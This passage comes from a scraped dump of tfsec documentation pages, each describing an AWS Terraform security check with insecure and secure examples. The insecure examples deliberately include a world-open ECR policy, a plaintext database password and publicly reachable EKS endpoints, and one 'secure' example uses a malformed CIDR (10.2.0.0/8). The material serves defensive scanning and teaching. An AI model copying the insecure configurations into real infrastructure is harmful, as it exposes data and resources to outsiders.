[https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#user_data,user_data_base64](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#user_data,user_data_base64){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:04.451344"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/volume-encryption-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/volume-encryption-customer-key/index.md", "content": "---\ntitle: EBS volume encryption should use Customer Managed Keys\n---\n\n# EBS volume encryption should use Customer Managed Keys\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nEncryption using AWS keys provides protection for your EBS volume. To increase control of the encryption and manage factors like rotation use customer managed keys.\n\n### Possible Impact\nUsing AWS managed keys does not allow for fine grained control\n\n### Suggested Resolution\nEnable encryption using customer managed keys\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-volume-encryption-customer-key check.\n```terraform\n\n resource \"aws_ebs_volume\" \"example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n \n   tags = {\n     Name = \"HelloWorld\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-volume-encryption-customer-key check.\n```terraform\n\n resource \"aws_kms_key\" \"ebs_encryption\" {\n \tenable_key_rotation = true\n }\n \n resource \"aws_ebs_volume\" \"example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n \n   kms_key_id = aws_kms_key.ebs_encryption.arn\n \n   tags = {\n     Name = \"HelloWorld\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#kms_key_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#kms_key_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:04.750829"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ecr/enable-image-scans/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ecr/enable-image-scans/index.md", "content": "---\ntitle: ECR repository has image scans disabled.\n---\n\n# ECR repository has image scans disabled.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nRepository image scans should be enabled to ensure vulnerable software can be discovered and remediated as soon as possible.\n\n### Possible Impact\nThe ability to scan images is not being used and vulnerabilities will not be highlighted\n\n### Suggested Resolution\nEnable ECR image scanning\n\n\n### Insecure Example\n\nThe following example will fail the aws-ecr-enable-image-scans check.\n```terraform\n\n resource \"aws_ecr_repository\" \"bad_example\" {\n   name                 = \"bar\"\n   image_tag_mutability = \"MUTABLE\"\n \n   image_scanning_configuration {\n     scan_on_push = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ecr-enable-image-scans check.\n```terraform\n\n resource \"aws_ecr_repository\" \"good_example\" {\n   name                 = \"bar\"\n   image_tag_mutability = \"MUTABLE\"\n \n   image_scanning_configuration {\n     scan_on_push = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#image_scanning_configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#image_scanning_configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning.html](https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:05.183740"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ecr/enforce-immutable-repository/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ecr/enforce-immutable-repository/index.md", "content": "---\ntitle: ECR images tags shouldn't be mutable.\n---\n\n# ECR images tags shouldn't be mutable.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nECR images should be set to IMMUTABLE to prevent code injection through image mutation.\n\nThis can be done by setting <code>image_tab_mutability</code> to <code>IMMUTABLE</code>\n\n### Possible Impact\nImage tags could be overwritten with compromised images\n\n### Suggested Resolution\nOnly use immutable images in ECR\n\n\n### Insecure Example\n\nThe following example will fail the aws-ecr-enforce-immutable-repository check.\n```terraform\n\n resource \"aws_ecr_repository\" \"bad_example\" {\n   name                 = \"bar\"\n   image_tag_mutability = \"MUTABLE\"\n \n   image_scanning_configuration {\n     scan_on_push = true\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ecr-enforce-immutable-repository check.\n```terraform\n\n resource \"aws_ecr_repository\" \"good_example\" {\n   name                 = \"bar\"\n   image_tag_mutability = \"IMMUTABLE\"\n \n   image_scanning_configuration {\n     scan_on_push = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://sysdig.com/blog/toctou-tag-mutability/](https://sysdig.com/blog/toctou-tag-mutability/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:05.488140"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ecr/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ecr/index.md", "content": "---\ntitle: ecr\n---\n\n# ecr\n\n## Checks\n\n\n- [enable-image-scans](enable-image-scans) ECR repository has image scans disabled.\n\n- [enforce-immutable-repository](enforce-immutable-repository) ECR images tags shouldn't be mutable.\n\n- [no-public-access](no-public-access) ECR repository policy must block public access\n\n- [repository-customer-key](repository-customer-key) ECR Repository should use customer managed keys to allow more control\n\n\n\n", "timestamp": "2025-10-24T22:24:05.596850"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ecr/no-public-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ecr/no-public-access/index.md", "content": "---\ntitle: ECR repository policy must block public access\n---\n\n# ECR repository policy must block public access\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nAllowing public access to the ECR repository risks leaking sensitive of abusable information\n\n### Possible Impact\nRisk of potential data leakage of sensitive artifacts\n\n### Suggested Resolution\nDo not allow public access in the policy\n\n\n### Insecure Example\n\nThe following example will fail the aws-ecr-no-public-access check.\n```terraform\n\n resource \"aws_ecr_repository\" \"foo\" {\n   name = \"bar\"\n }\n \n resource \"aws_ecr_repository_policy\" \"foopolicy\" {\n   repository = aws_ecr_repository.foo.name\n \n   policy = <<EOF\n {\n     \"Version\": \"2008-10-17\",\n     \"Statement\": [\n         {\n             \"Sid\": \"new policy\",\n             \"Effect\": \"Allow\",\n             \"Principal\": \"*\",\n             \"Action\": [\n                 \"ecr:GetDownloadUrlForLayer\",\n                 \"ecr:BatchGetImage\",\n                 \"ecr:BatchCheckLayerAvailability\",\n                 \"ecr:PutImage\",\n                 \"ecr:InitiateLayerUpload\",\n                 \"ecr:UploadLayerPart\",\n                 \"ecr:CompleteLayerUpload\",\n                 \"ecr:DescribeRepositories\",\n                 \"ecr:GetRepositoryPolicy\",\n                 \"ecr:ListImages\",\n                 \"ecr:DeleteRepository\",\n                 \"ecr:BatchDeleteImage\",\n                 \"ecr:SetRepositoryPolicy\",\n                 \"ecr:DeleteRepositoryPolicy\"\n             ]\n         }\n     ]\n }\n EOF\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ecr-no-public-access check.\n```terraform\n\n resource \"aws_ecr_repository\" \"foo\" {\n   name = \"bar\"\n }\n \n resource \"aws_ecr_repository_policy\" \"foopolicy\" {\n   repository = aws_ecr_repository.foo.name\n \n   policy = <<EOF\n {\n     \"Version\": \"2008-10-17\",\n     \"Statement\": [\n         {\n             \"Sid\": \"new policy\",\n             \"Effect\": \"Allow\",\n             \"Principal\": \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\",\n             \"Action\": [\n                 \"ecr:GetDownloadUrlForLayer\",\n                 \"ecr:BatchGetImage\",\n                 \"ecr:BatchCheckLayerAvailability\",\n                 \"ecr:PutImage\",\n                 \"ecr:InitiateLayerUpload\",\n                 \"ecr:UploadLayerPart\",\n                 \"ecr:CompleteLayerUpload\",\n                 \"ecr:DescribeRepositories\",\n                 \"ecr:GetRepositoryPolicy\",\n                 \"ecr:ListImages\",\n                 \"ecr:DeleteRepository\",\n                 \"ecr:BatchDeleteImage\",\n                 \"ecr:SetRepositoryPolicy\",\n                 \"ecr:DeleteRepositoryPolicy\"\n             ]\n         }\n     ]\n }\n EOF\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository_policy#policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository_policy#policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonECR/latest/public/public-repository-policies.html](https://docs.aws.amazon.com/AmazonECR/latest/public/public-repository-policies.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:05.880823"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ecr/repository-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ecr/repository-customer-key/index.md", "content": "---\ntitle: ECR Repository should use customer managed keys to allow more control\n---\n\n# ECR Repository should use customer managed keys to allow more control\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nImages in the ECR repository are encrypted by default using AWS managed encryption keys. To increase control of the encryption and control the management of factors like key rotation, use a Customer Managed Key.\n\n### Possible Impact\nUsing AWS managed keys does not allow for fine grained control\n\n### Suggested Resolution\nUse customer managed keys\n\n\n### Insecure Example\n\nThe following example will fail the aws-ecr-repository-customer-key check.\n```terraform\n\n resource \"aws_ecr_repository\" \"bad_example\" {\n \tname                 = \"bar\"\n \timage_tag_mutability = \"MUTABLE\"\n   \n \timage_scanning_configuration {\n \t  scan_on_push = true\n \t}\n   }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ecr-repository-customer-key check.\n```terraform\n\n resource \"aws_kms_key\" \"ecr_kms\" {\n \tenable_key_rotation = true\n }\n \n resource \"aws_ecr_repository\" \"good_example\" {\n \tname                 = \"bar\"\n \timage_tag_mutability = \"MUTABLE\"\n   \n \timage_scanning_configuration {\n \t  scan_on_push = true\n \t}\n \n \tencryption_configuration {\n \t\tencryption_type = \"KMS\"\n \t\tkms_key = aws_kms_key.ecr_kms.key_id\n \t}\n   }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#encryption_configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#encryption_configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonECR/latest/userguide/encryption-at-rest.html](https://docs.aws.amazon.com/AmazonECR/latest/userguide/encryption-at-rest.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:06.166576"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ecs/enable-container-insight/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ecs/enable-container-insight/index.md", "content": "---\ntitle: ECS clusters should have container insights enabled\n---\n\n# ECS clusters should have container insights enabled\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nCloudwatch Container Insights provide more metrics and logs for container based applications and micro services.\n\n### Possible Impact\nNot all metrics and logs may be gathered for containers when Container Insights isn't enabled\n\n### Suggested Resolution\nEnable Container Insights\n\n\n### Insecure Example\n\nThe following example will fail the aws-ecs-enable-container-insight check.\n```terraform\n\n resource \"aws_ecs_cluster\" \"bad_example\" {\n   \tname = \"services-cluster\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ecs-enable-container-insight check.\n```terraform\n\n resource \"aws_ecs_cluster\" \"good_example\" {\n \tname = \"services-cluster\"\n   \n \tsetting {\n \t  name  = \"containerInsights\"\n \t  value = \"enabled\"\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_cluster#setting](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_cluster#setting){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/ContainerInsights.html](https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/ContainerInsights.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:06.624255"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ecs/enable-in-transit-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ecs/enable-in-transit-encryption/index.md", "content": "---\ntitle: ECS Task Definitions with EFS volumes should use in-transit encryption\n---\n\n# ECS Task Definitions with EFS volumes should use in-transit encryption\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nECS task definitions that have volumes using EFS configuration should explicitly enable in transit encryption to prevent the risk of data loss due to interception.\n\n### Possible Impact\nIntercepted traffic to and from EFS may lead to data loss\n\n### Suggested Resolution\nEnable in transit encryption when using efs\n\n\n### Insecure Example\n\nThe following example will fail the aws-ecs-enable-in-transit-encryption check.\n```terraform\n\n resource \"aws_ecs_task_definition\" \"bad_example\" {\n \tfamily                = \"service\"\n \tcontainer_definitions = file(\"task-definitions/service.json\")\n   \n \tvolume {\n \t  name = \"service-storage\"\n   \n \t  efs_volume_configuration {\n \t\tfile_system_id          = aws_efs_file_system.fs.id\n \t\troot_directory          = \"/opt/data\"\n \t\tauthorization_config {\n \t\t  access_point_id = aws_efs_access_point.test.id\n \t\t  iam             = \"ENABLED\"\n \t\t}\n \t  }\n \t}\n   }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ecs-enable-in-transit-encryption check.\n```terraform\n\n resource \"aws_ecs_task_definition\" \"good_example\" {\n \tfamily                = \"service\"\n \tcontainer_definitions = file(\"task-definitions/service.json\")\n   \n \tvolume {\n \t  name = \"service-storage\"\n   \n \t  efs_volume_configuration {\n \t\tfile_system_id          = aws_efs_file_system.fs.id\n \t\troot_directory          = \"/opt/data\"\n \t\ttransit_encryption      = \"ENABLED\"\n \t\ttransit_encryption_port = 2999\n \t\tauthorization_config {\n \t\t  access_point_id = aws_efs_access_point.test.id\n \t\t  iam             = \"ENABLED\"\n \t\t}\n \t  }\n \t}\n   }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition#transit_encryption](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition#transit_encryption){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonECS/latest/userguide/efs-volumes.html](https://docs.aws.amazon.com/AmazonECS/latest/userguide/efs-volumes.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/efs/latest/ug/encryption-in-transit.html](https://docs.aws.amazon.com/efs/latest/ug/encryption-in-transit.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:06.900111"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ecs/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ecs/index.md", "content": "---\ntitle: ecs\n---\n\n# ecs\n\n## Checks\n\n\n- [enable-container-insight](enable-container-insight) ECS clusters should have container insights enabled\n\n- [enable-in-transit-encryption](enable-in-transit-encryption) ECS Task Definitions with EFS volumes should use in-transit encryption\n\n- [no-plaintext-secrets](no-plaintext-secrets) Task definition defines sensitive environment variable(s).\n\n\n\n", "timestamp": "2025-10-24T22:24:07.024470"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ecs/no-plaintext-secrets/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ecs/no-plaintext-secrets/index.md", "content": "---\ntitle: Task definition defines sensitive environment variable(s).\n---\n\n# Task definition defines sensitive environment variable(s).\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nYou should not make secrets available to a user in plaintext in any scenario. Secrets can instead be pulled from a secure secret storage system by the service requiring them.\n\n### Possible Impact\nSensitive data could be exposed in the AWS Management Console\n\n### Suggested Resolution\nUse secrets for the task definition\n\n\n### Insecure Example\n\nThe following example will fail the aws-ecs-no-plaintext-secrets check.\n```terraform\n\n resource \"aws_ecs_task_definition\" \"bad_example\" {\n   container_definitions = <<EOF\n [\n   {\n     \"name\": \"my_service\",\n     \"essential\": true,\n     \"memory\": 256,\n     \"environment\": [\n       { \"name\": \"ENVIRONMENT\", \"value\": \"development\" },\n       { \"name\": \"DATABASE_PASSWORD\", \"value\": \"oh no D:\"}\n     ]\n   }\n ]\n EOF\n \n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ecs-no-plaintext-secrets check.\n```terraform\n\n resource \"aws_ecs_task_definition\" \"good_example\" {\n   container_definitions = <<EOF\n [\n   {\n     \"name\": \"my_service\",\n     \"essential\": true,\n     \"memory\": 256,\n     \"environment\": [\n       { \"name\": \"ENVIRONMENT\", \"value\": \"development\" }\n     ]\n   }\n ]\n EOF\n \n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/systems-manager/latest/userguide/integration-ps-secretsmanager.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/integration-ps-secretsmanager.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.vaultproject.io/](https://www.vaultproject.io/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:07.396372"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/efs/enable-at-rest-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/efs/enable-at-rest-encryption/index.md", "content": "---\ntitle: EFS Encryption has not been enabled\n---\n\n# EFS Encryption has not been enabled\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nIf your organization is subject to corporate or regulatory policies that require encryption of data and metadata at rest, we recommend creating a file system that is encrypted at rest, and mounting your file system using encryption of data in transit.\n\n### Possible Impact\nData can be read from the EFS if compromised\n\n### Suggested Resolution\nEnable encryption for EFS\n\n\n### Insecure Example\n\nThe following example will fail the aws-efs-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_efs_file_system\" \"bad_example\" {\n   name       = \"bar\"\n   encrypted  = false\n   kms_key_id = \"\"\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-efs-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_efs_file_system\" \"good_example\" {\n   name       = \"bar\"\n   encrypted  = true\n   kms_key_id = \"my_kms_key\"\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/efs/latest/ug/encryption.html](https://docs.aws.amazon.com/efs/latest/ug/encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:07.931461"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/eks/enable-control-plane-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/eks/enable-control-plane-logging/index.md", "content": "---\ntitle: EKS Clusters should have cluster control plane logging turned on\n---\n\n# EKS Clusters should have cluster control plane logging turned on\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nBy default cluster control plane logging is not turned on. Logging is available for audit, api, authenticator, controllerManager and scheduler. All logging should be turned on for cluster control plane.\n\n### Possible Impact\nLogging provides valuable information about access and usage\n\n### Suggested Resolution\nEnable logging for the EKS control plane\n\n\n### Insecure Example\n\nThe following example will fail the aws-eks-enable-control-plane-logging check.\n```terraform\n\n resource \"aws_eks_cluster\" \"bad_example\" {\n     encryption_config {\n         resources = [ \"secrets\" ]\n         provider {\n             key_arn = var.kms_arn\n         }\n     }\n \n     name = \"bad_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = false\n     }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-eks-enable-control-plane-logging check.\n```terraform\n\n resource \"aws_eks_cluster\" \"good_example\" {\n     encryption_config {\n         resources = [ \"secrets\" ]\n         provider {\n             key_arn = var.kms_arn\n         }\n     }\n \n \tenabled_cluster_log_types = [\"api\", \"authenticator\", \"audit\", \"scheduler\", \"controllerManager\"]\n \n     name = \"good_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = false\n     }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#enabled_cluster_log_types](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#enabled_cluster_log_types){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/eks/latest/userguide/control-plane-logs.html](https://docs.aws.amazon.com/eks/latest/userguide/control-plane-logs.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:08.796408"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/eks/encrypt-secrets/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/eks/encrypt-secrets/index.md", "content": "---\ntitle: EKS should have the encryption of secrets enabled\n---\n\n# EKS should have the encryption of secrets enabled\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nEKS cluster resources should have the encryption_config block set with protection of the secrets resource.\n\n### Possible Impact\nEKS secrets could be read if compromised\n\n### Suggested Resolution\nEnable encryption of EKS secrets\n\n\n### Insecure Example\n\nThe following example will fail the aws-eks-encrypt-secrets check.\n```terraform\n\n resource \"aws_eks_cluster\" \"bad_example\" {\n     name = \"bad_example_cluster\"\n \n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = false\n     }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-eks-encrypt-secrets check.\n```terraform\n\n resource \"aws_eks_cluster\" \"good_example\" {\n     encryption_config {\n         resources = [ \"secrets\" ]\n         provider {\n             key_arn = var.kms_arn\n         }\n     }\n \n     name = \"good_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = false\n     }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#encryption_config](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#encryption_config){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://aws.amazon.com/about-aws/whats-new/2020/03/amazon-eks-adds-envelope-encryption-for-secrets-with-aws-kms/](https://aws.amazon.com/about-aws/whats-new/2020/03/amazon-eks-adds-envelope-encryption-for-secrets-with-aws-kms/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:09.095223"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/eks/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/eks/index.md", "content": "---\ntitle: eks\n---\n\n# eks\n\n## Checks\n\n\n- [enable-control-plane-logging](enable-control-plane-logging) EKS Clusters should have cluster control plane logging turned on\n\n- [encrypt-secrets](encrypt-secrets) EKS should have the encryption of secrets enabled\n\n- [no-public-cluster-access](no-public-cluster-access) EKS Clusters should have the public access disabled\n\n- [no-public-cluster-access-to-cidr](no-public-cluster-access-to-cidr) EKS cluster should not have open CIDR range for public access\n\n\n\n", "timestamp": "2025-10-24T22:24:09.200523"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/eks/no-public-cluster-access-to-cidr/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/eks/no-public-cluster-access-to-cidr/index.md", "content": "---\ntitle: EKS cluster should not have open CIDR range for public access\n---\n\n# EKS cluster should not have open CIDR range for public access\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nEKS Clusters have public access cidrs set to 0.0.0.0/0 by default which is wide open to the internet. This should be explicitly set to a more specific private CIDR range\n\n### Possible Impact\nEKS can be accessed from the internet\n\n### Suggested Resolution\nDon't enable public access to EKS Clusters\n\n\n### Insecure Example\n\nThe following example will fail the aws-eks-no-public-cluster-access-to-cidr check.\n```terraform\n\n resource \"aws_eks_cluster\" \"bad_example\" {\n     // other config \n \n     name = \"bad_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = true\n     }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-eks-no-public-cluster-access-to-cidr check.\n```terraform\n\n resource \"aws_eks_cluster\" \"good_example\" {\n     // other config \n \n     name = \"good_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = true\n         public_access_cidrs = [\"10.2.0.0/8\"]\n     }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#vpc_config](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#vpc_config){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/eks/latest/userguide/create-public-private-vpc.html](https://docs.aws.amazon.com/eks/latest/userguide/create-public-private-vpc.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:09.583553"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/eks/no-public-cluster-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/eks/no-public-cluster-access/index.md", "content": "---\ntitle: EKS Clusters should have the public access disabled\n---\n\n# EKS Clusters should have the public access disabled\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nEKS clusters are available publicly by default, this should be explicitly disabled in the vpc_config of the EKS cluster resource.\n\n### Possible Impact\nEKS can be access from the internet\n\n### Suggested Resolution\nDon't enable public access to EKS Clusters\n\n\n### Insecure Example\n\nThe following example will fail the aws-eks-no-public-cluster-access check.\n```terraform\n\n resource \"aws_eks_cluster\" \"bad_example\" {\n     // other config \n \n     name = \"bad_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n \t\tendpoint_public_access = true\n \t\tpublic_access_cidrs = [\"0.0.0.0/0\"]\n     }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-eks-no-public-cluster-access check.\n```terraform\n\n resource \"aws_eks_cluster\" \"good_example\" {\n     // other config \n \n     name = \"good_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = false\n     }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#endpoint_public_access](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#endpoint_public_access){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html](https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:09.932576"}
